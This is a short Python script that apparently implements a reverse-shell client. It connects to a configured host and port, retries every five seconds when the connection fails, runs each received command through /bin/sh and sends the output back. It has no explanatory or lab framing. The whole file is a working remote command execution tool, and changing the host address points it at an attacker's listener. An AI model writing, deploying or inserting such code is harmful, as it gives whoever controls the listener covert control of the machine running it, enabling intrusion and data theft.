import socket
import subprocess
import time

SERVER_HOST = '127.0.0.1'  
SERVER_PORT = 5005

def connect_to_server():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((SERVER_HOST, SERVER_PORT))
            
            while True:
                command = client.recv(1024).decode('utf-8')
                
                if not command or command.lower() == 'exit':
                    break
                
                output = subprocess.run(
                    ['/bin/sh', '-c', command], 
                    capture_output=True, 
                    text=True, 
                    errors='replace'
                )
                
                response = output.stdout + output.stderr
                if not response:
                    response = " Executed with no output"
                    
                client.send(response.encode('utf-8'))
                
        except (socket.error, ConnectionRefusedError):
            time.sleep(5)
        except Exception:
            break
        finally:
            client.close()

if __name__ == "__main__":
    connect_to_server()
